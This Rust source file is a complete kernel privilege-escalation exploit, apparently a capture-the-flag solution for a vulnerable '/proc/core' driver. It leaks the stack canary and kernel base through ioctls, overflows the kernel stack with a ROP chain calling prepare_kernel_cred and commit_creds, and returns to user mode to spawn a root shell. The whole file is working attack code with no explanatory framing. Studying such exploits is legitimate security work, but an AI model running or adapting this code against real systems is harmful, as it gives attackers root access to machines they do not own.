use kpwn::all::*;

#[repr(C)]
#[derive(Default)]
struct Payload {
    pub bogus: [u64; 8],
    pub canary: u64,
    pub rbx: u64,
    pub chain: [u64; 10],
    pub frame: TrapFrame64,
}

extern "C" fn ret_from_kernel() -> ! {
    log::info!("Back from kernel space");
    whoami();
    execve_sh().unwrap();
    panic!();
}

fn main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    whoami();

    let dev = open_dev("/proc/core").unwrap();

    // Leak stack canary from kernel
    let mut buf = [0u64; 8];
    unsafe {
        assert_eq!(dev.ioctl_raw(0x6677889C, 64), 0);
        assert_eq!(dev.ioctl_raw(0x6677889B, buf.as_mut_ptr() as u64), 0);
    }
    log::debug!("Read from kernel: {buf:#x?}");

    // Compute kernel base address
    let kb = KernelRebaser::new(buf[4] - 0x11DD6D1);
    log::info!("Kernel base = {:#x}", kb.base);

    // Build payload
    let mut payload = Payload {
        canary: buf[0],
        chain: [
            // pop rdi
            0xffffffff81126515,
            0,
            // prepare_kernel_cred
            0xffffffff8109cce0,
            // pop rdx
            0xffffffff813a14ad,
            // pop rdi
            0xffffffff81126515,
            // push rax; jmp rdx
            0xffffffff8163af99,
            // commit_creds
            0xffffffff8109c8e0,
            // swapgs_restore_regs_and_return_to_usermode + 0x15
            0xffffffff81a008f0,
            // user rax & rdi
            0xaa01,
            0xaa02,
        ],
        frame: TrapFrame64::new(ret_from_kernel),
        ..Default::default()
    };
    // Fixup kernel addresses in the ROP chain
    kb.fixup_all(&mut payload.chain);

    unsafe {
        // Set kernel buffer to payload
        dev.write_all_raw(&payload).unwrap();

        // Trigger stack overflow
        log::info!("Trigger!");
        let mask = !0xFFFFu64; // set higher bits to 1
        let explode_len = std::mem::size_of::<Payload>() as u64;
        dev.ioctl_raw(0x6677889A, mask | explode_len);

        // Now the kernel should execute our ROP chain
    }

    log::error!("We failed :(");
    dev.close().unwrap();
}
